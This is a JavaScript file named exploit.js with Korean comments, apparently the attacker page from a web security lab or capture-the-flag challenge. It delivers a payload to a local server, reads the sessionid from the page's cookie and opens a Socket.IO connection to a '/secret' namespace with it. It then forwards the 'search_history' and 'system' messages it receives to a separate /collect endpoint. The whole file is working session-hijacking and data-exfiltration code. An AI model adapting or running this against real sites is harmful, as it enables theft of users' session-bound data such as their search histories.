// exploit/exploit.js

document.addEventListener("DOMContentLoaded", () => {
    const exploitBody = document.getElementById("exploitBody");
    const exploitForm = document.getElementById("exploitForm");
    const logsBtn = document.getElementById("logsBtn");
    const homeBtn = document.getElementById("homeBtn");
    const protocol = window.location.protocol;
    const host = window.location.hostname;
    const logsPort = 777;
    const mainServerUrl = `http://localhost:727`;
    const collectUrl = `http://localhost:777/collect`;

    // ----------------- 기존 익스플로잇 폼 동작 ----------------- //
    exploitForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const payload = exploitBody.value.trim();
        if (!payload) return;

        try {
            await fetch(`${mainServerUrl}/deliver`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                mode: "cors",  
                body: JSON.stringify({ payload })
            });
        } catch (err) {
            console.error("Error delivering exploit:", err);
        }
    });

    if (logsBtn) {
        logsBtn.addEventListener("click", () => {
            const logsUrl = `${protocol}//${host}:${logsPort}/logs`;
            window.open(logsUrl, "_blank");
        });
    }

    if (homeBtn) {
        homeBtn.addEventListener("click", () => {
            window.location.href = `${mainServerUrl}/`;
        });
    }

    // ----------------- Socket.IO 메시지 수신 기능 ----------------- //
    try {
        // CDN에서 Socket.IO 클라이언트 로드 필요
        const script = document.createElement("script");
        script.src = "https://cdn.socket.io/4.6.1/socket.io.min.js";
        script.onload = () => {
            const sessionid = getSessionId(); // 쿠키에서 sessionid 가져오기
            const socket = io(`${mainServerUrl}/secret/socket.io/`, {
                transports: ["websocket"],
            });

            socket.on("connect", () => {
                console.log("Connected to Socket.IO server");
                socket.emit("READY", { sessionid }); // 쿠키 기반 sessionid 전달
            });

            socket.on("search_history", (data) => {
                const msg = JSON.stringify(data);
                fetch(collectUrl, {
                    method: "POST",
                    mode: "no-cors",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ msg })
                });
            });

            socket.on("system", (data) => {
                const msg = JSON.stringify(data);
                fetch(collectUrl, {
                    method: "POST",
                    mode: "no-cors",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ msg })
                });
            });

            socket.on("disconnect", () => {
                console.log("Disconnected from Socket.IO server");
            });
        };
        document.head.appendChild(script);
    } catch (err) {
        console.error("Socket.IO initialization failed:", err);
    }

    function getSessionId() {
        const match = document.cookie.match(/sessionid=([a-zA-Z0-9-]+)/);
        return match ? match[1] : null;
    }
});
